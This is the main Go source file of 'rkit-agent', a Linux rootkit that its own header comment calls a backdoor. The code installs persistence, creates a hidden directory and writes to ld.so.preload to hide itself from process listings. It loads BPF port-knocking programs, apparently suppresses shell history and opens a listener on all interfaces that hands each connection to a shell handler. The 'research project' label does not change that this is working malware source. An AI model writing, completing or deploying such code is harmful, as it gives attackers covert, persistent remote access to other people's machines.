//go:build linux

// rkit-agent: backdoor that listens on port 2333, spawns a shell, and uses LD_PRELOAD
// to hide itself from process listings. LinkPro-style research project.
package main

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"

	"golang.org/x/sys/unix"
)

func main() {
	if len(os.Args) >= 2 && os.Args[1] == "install" {
		if err := installPersistence(); err != nil {
			fmt.Fprintf(os.Stderr, "rkit-agent install: %v\n", err)
			os.Exit(1)
		}
		return
	}

	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "rkit-agent: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	if err := setupHiddenDir(); err != nil {
		return fmt.Errorf("setup hidden dir: %w", err)
	}

	if unix.Geteuid() == 0 {
		if err := setupLdPreload(); err != nil {
			fmt.Fprintf(os.Stderr, "rkit-agent: ld.so.preload (optional): %v\n", err)
		}
	}

	cleanupIface = os.Getenv("RKIT_IFACE")
	if cleanupIface == "" {
		cleanupIface = "eth0"
	}

	var hold *bpfHold
	if unix.Geteuid() == 0 {
		var err error
		hold, err = loadBpf()
		if err == nil {
			if hold.knockColls != nil {
				for _, c := range hold.knockColls {
					defer c.Close()
				}
				for _, l := range hold.knockLinks {
					defer l.Close()
				}
			}
		}
		cleanupHold = hold
	}

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		doCleanup()
		os.Exit(0)
	}()

	if err := ensureHistorySink(); err != nil {
		fmt.Fprintf(os.Stderr, "rkit-agent: history sink (optional): %v\n", err)
	}

	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		return fmt.Errorf("listen: %w", err)
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			return fmt.Errorf("accept: %w", err)
		}
		go handleConn(conn)
	}
}
